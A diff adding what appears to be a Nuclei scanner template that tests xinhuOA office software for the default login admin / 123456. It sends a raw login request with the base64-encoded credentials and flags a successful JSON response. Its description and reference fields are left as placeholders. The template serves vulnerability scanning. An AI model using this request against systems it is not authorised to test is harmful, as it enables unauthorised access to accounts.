@@ -1,0 +1,42 @@
+id: login-default-xinhuOA
+info:
+  name: login-default-xinhuOA
+  author: capiton
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: xinhuoa
+requests:
+  - raw:
+      - |-
+        POST /index.php?a=check&m=login&d=&ajaxbool=true&rnd=568072 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/?m=login
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=bau76hisfnptbbhvt7gcp51cp4; deviceid=1668497785426
+
+        rempass=0&jmpass=false&device=1668497785426&ltype=0&adminuser={{base64(username)}}&adminpass={{base64(password)}}&yanzm=
+
+    payloads:
+      username:
+        - admin
+      password:
+        - 123456
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true,"'
+      - type: status
+        status:
+          - 200
